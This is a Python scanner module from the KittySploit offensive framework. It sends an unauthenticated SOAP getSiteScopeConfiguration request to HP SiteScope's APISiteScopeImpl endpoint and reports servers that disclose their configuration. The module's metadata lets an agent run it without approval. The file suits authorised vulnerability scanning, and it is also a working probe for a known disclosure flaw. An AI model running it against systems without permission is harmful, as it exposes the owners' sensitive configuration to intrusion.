#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""HP SiteScope getSiteScopeConfiguration information disclosure."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'HP SiteScope - getSiteScopeConfiguration Detection',
        'description': (
            'Detects unauthenticated SOAP getSiteScopeConfiguration disclosure via '
            '/services/APISiteScopeImpl.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': [
            'web', 'scanner', 'hp', 'sitescope', 'info-disclosure', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 0.9,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'risk_signal', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/20369',
        ],
    }

    def run(self):
        soap = (
            "<?xml version='1.0' encoding='UTF-8'?>\r\n"
            "<wsns0:Envelope\r\n"
            "xmlns:wsns1='http://www.w3.org/2001/XMLSchema-instance'\r\n"
            "xmlns:xsd='http://www.w3.org/2001/XMLSchema'\r\n"
            "xmlns:wsns0='http://schemas.xmlsoap.org/soap/envelope/'\r\n"
            ">\r\n"
            "<wsns0:Body\r\n"
            "wsns0:encodingStyle='http://schemas.xmlsoap.org/soap/encoding/'\r\n"
            ">\r\n"
            "<impl:getSiteScopeConfiguration\r\n"
            "xmlns:impl='http://Api.freshtech.COM'\r\n"
            "></impl:getSiteScopeConfiguration>\r\n"
            "</wsns0:Body>\r\n"
            "</wsns0:Envelope>"
        )
        for base in ('', '/SiteScope'):
            r = self.http_request(
                method='POST',
                path=f'{base}/services/APISiteScopeImpl',
                data=soap,
                headers={
                    'SOAPAction': '""',
                    'Content-Type': 'text/xml; charset=UTF-8',
                },
                allow_redirects=False,
            )
            if not r or r.status_code != 200:
                continue
            body = r.text or ''
            if 'getSiteScopeConfigurationReturn href="cid:' in body:
                self.set_info(
                    severity='high',
                    reason='HP SiteScope getSiteScopeConfiguration disclosure',
                    path=f'{base}/services/APISiteScopeImpl',
                )
                return True
        return False
